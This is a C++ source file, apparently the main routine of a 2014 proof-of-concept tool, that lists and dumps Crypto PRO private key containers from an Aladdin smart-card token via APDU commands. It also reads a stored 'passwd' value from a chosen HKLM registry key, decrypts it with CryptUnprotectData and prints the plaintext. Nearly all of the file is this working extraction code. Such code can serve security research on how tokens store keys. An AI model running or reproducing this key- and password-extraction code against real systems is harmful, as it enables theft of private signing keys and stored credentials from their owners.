//
// Dump Crypto PRO key container from Aladdin token by sending APDU commands
//
//
//                 sergey v soldatov, October, 2014



#include "Token.h"
#include "Options.h"
#include "Random.h"

#include <iostream>
#include <fstream>

using namespace std;



int main(int argc, char *argv[]){

	Options opt(argc, argv);
	if (opt.opt_d) opt.showOpt();
	if (opt.opt_h){
		return 0;
	}

	//
	// Decrypt password
	//
	if (opt.opt_k){
		if (opt.opt_d) cout << "[+] Decrypt password from key \""<<opt.opt_k << "\"" <<endl;

		const char *szValueName = "passwd";
		
		DWORD nMaxLength = 2048;
		DWORD   rc;
		DWORD   dwType;
		HKEY    hKey;
		
		BYTE *pBuffer = new BYTE[nMaxLength];

		if ( ERROR_SUCCESS == ( rc= RegOpenKeyEx(
			HKEY_LOCAL_MACHINE,  
			opt.opt_k,           
			0,                   
			/*KEY_WOW64_32KEY KEY_QUERY_VALUE*/ KEY_READ,
			&hKey      
			)) 
			)
		{
			rc = RegQueryValueEx(
				hKey,
				(const char*)szValueName,
				0,
				&dwType,
				(LPBYTE)pBuffer,
				&nMaxLength);
			if (rc != ERROR_SUCCESS)
			{
				if (opt.opt_d) cout << "RegQueryValueEx error: " << rc << endl;
				return 102;
			}

			if (opt.opt_d){
				cout << "Read from registry: " << endl;
				showarr(pBuffer, nMaxLength, ' ');
			}

			LPWSTR pDescrOut = NULL;
			DATA_BLOB DataIn, DataVerify;
			DataIn.cbData = nMaxLength;
			DataIn.pbData = pBuffer;

			if (CryptUnprotectData(
				&DataIn,
				&pDescrOut,
				NULL,
				NULL,
				NULL,
				0,
				&DataVerify))
			{
				cout << "decrypted (HEX): "; showarr(DataVerify.pbData, DataVerify.cbData, ' ');
				cout << "decrypted (char): "; showarr2(DataVerify.pbData, DataVerify.cbData);
			}
			else
			{
				if (opt.opt_d) cout << "CryptUnprotectData error " << endl;
				return 103;
			}

			RegCloseKey(hKey);
		}
		else
		{
			if (opt.opt_d) cout << "RegOpenKeyEx error: " << rc << endl;
			return 101;
		}

		delete[] pBuffer;

		return 0;
	}

	Token token(opt);

	if (token.checkATR() ){
		//
		// Dump continer
		//
		if (opt.opt_s != -10){
			if (opt.opt_p == 0){ //check if password was specified
				opt.printHelp();
				return 1;
			}

			if (opt.opt_s == -1){ //dump all
				vector<string> v;
				token.list_containers(v);
				for (int i = 0; i < v.size(); i++)
					token.dump_container(i);
			}
			else{ //dump exactly one
				token.dump_container(opt.opt_s);
			}
			return 0;
		}
		//
		// List containers
		//
		if (opt.opt_l){
			vector<string> v;
			token.list_containers(v);
			for (int ii = 0; ii < v.size(); ii++){
				cout << ii<<". "<< v[ii] << endl;
			}
			return 0;
		}
		//
		// Send APDU from file
		//
		token.sendAPDUFromFile(opt.opt_i);

	} //check ATR
	else {
		cout << "Inserted token has ATR: "; showarr(token.ATR, token.lATR, ':'); 
		cout << "that unfortunately is unsupported in this POC code :-(" << endl;
	}

	return 0;
}